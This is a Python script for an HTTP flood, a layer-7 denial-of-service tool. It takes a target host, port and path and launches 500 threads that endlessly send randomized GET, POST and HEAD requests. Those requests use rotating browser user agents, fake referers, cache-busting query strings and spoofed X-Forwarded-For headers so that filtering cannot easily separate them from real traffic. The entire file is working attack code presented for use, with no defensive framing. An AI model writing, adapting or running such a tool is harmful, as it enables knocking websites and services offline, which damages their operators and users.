import sys
import time
import socket
import random
import threading
from datetime import datetime
from pyfiglet import figlet_format

# Configuration
THREADS = 500  # ចំនួន threads (កែតាមតម្រូវការ)
sent_count = 0
lock = threading.Lock()

# Show current time
now = datetime.now()
print(f"[*] Script started at: {now.strftime('%Y-%m-%d %H:%M:%S')}")

# Get input
target = input("[?] Target URL (e.g. example.com): ").strip()
port = int(input("[?] Port (80 for HTTP, 443 for HTTPS): ").strip())
path = input("[?] Path (e.g. / or /api/data): ").strip() or "/"

# Display ASCII banner
print(figlet_format("Advanced L7"))

# Loading animation
animation = [
    "[■□□□□□□□□□]", "[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]",
    "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]",
    "[■■■■■■■■■□]", "[■■■■■■■■■■]"
]
for i in range(len(animation)):
    time.sleep(0.2)
    sys.stdout.write(f"\rLoading {animation[i % len(animation)]}")
    sys.stdout.flush()
print("\n")

print(f"[+] Target: {target}:{port}{path}")
print(f"[+] Threads: {THREADS}")
print(f"[!] Press CTRL+C to stop\n")

# Expanded User agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.43 Mobile Safari/537.36"
]

# Referers for more realistic traffic
referers = [
    f"https://{target}/",
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
    ""
]

# Accept languages
accept_languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "km-KH,km;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8"
]

def attack():
    """Main attack function - runs in each thread"""
    global sent_count
    
    while True:
        try:
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            # Connect to target
            sock.connect((target, port))
            
            # Randomize request components
            ua = random.choice(user_agents)
            ref = random.choice(referers)
            lang = random.choice(accept_languages)
            
            # Multiple request methods
            methods = ["GET", "POST", "HEAD"]
            method = random.choice(methods)
            
            # Build HTTP request with advanced headers
            http_request = f"{method} {path}?q={random.randint(1, 999999)}&cache={random.randint(1, 999999)} HTTP/1.1\r\n"
            http_request += f"Host: {target}\r\n"
            http_request += f"User-Agent: {ua}\r\n"
            http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
            http_request += f"Accept-Language: {lang}\r\n"
            http_request += "Accept-Encoding: gzip, deflate, br\r\n"
            http_request += "Connection: keep-alive\r\n"
            
            if ref:
                http_request += f"Referer: {ref}\r\n"
            
            http_request += "Upgrade-Insecure-Requests: 1\r\n"
            http_request += "Cache-Control: max-age=0\r\n"
            http_request += "DNT: 1\r\n"
            http_request += f"X-Forwarded-For: {random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}\r\n"
            
            # For POST requests, add body
            if method == "POST":
                body = f"data={random.randint(1, 999999)}"
                http_request += f"Content-Type: application/x-www-form-urlencoded\r\n"
                http_request += f"Content-Length: {len(body)}\r\n"
                http_request += f"\r\n{body}"
            else:
                http_request += "\r\n"
            
            # Send request
            sock.send(http_request.encode())
            
            # Update counter
            with lock:
                sent_count += 1
            
            # Try to receive response (makes it more realistic)
            try:
                sock.recv(1024)
            except:
                pass
            
            sock.close()
            
        except socket.error:
            # Connection failed, retry
            pass
        except Exception:
            pass

def monitor():
    """Monitor and display statistics"""
    global sent_count
    previous = 0
    
    while True:
        time.sleep(1)
        current = sent_count
        rps = current - previous  # Requests per second
        previous = current
        
        sys.stdout.write(f"\r[*] Total: {current} requests | Speed: {rps} req/s")
        sys.stdout.flush()

# Main execution
try:
    # Start monitor thread
    monitor_thread = threading.Thread(target=monitor, daemon=True)
    monitor_thread.start()
    
    # Start attack threads
    print(f"[+] Launching {THREADS} threads...")
    time.sleep(1)
    
    threads = []
    for i in range(THREADS):
        thread = threading.Thread(target=attack, daemon=True)
        thread.start()
        threads.append(thread)
    
    # Keep main thread alive
    while True:
        time.sleep(1)
        
except KeyboardInterrupt:
    print("\n\n[!] Stopping attack...")
    print(f"[*] Total requests sent: {sent_count}")
    print("[*] Test completed.")
    sys.exit(0)
except Exception as e:
    print(f"\n[!] Error occurred: {e}")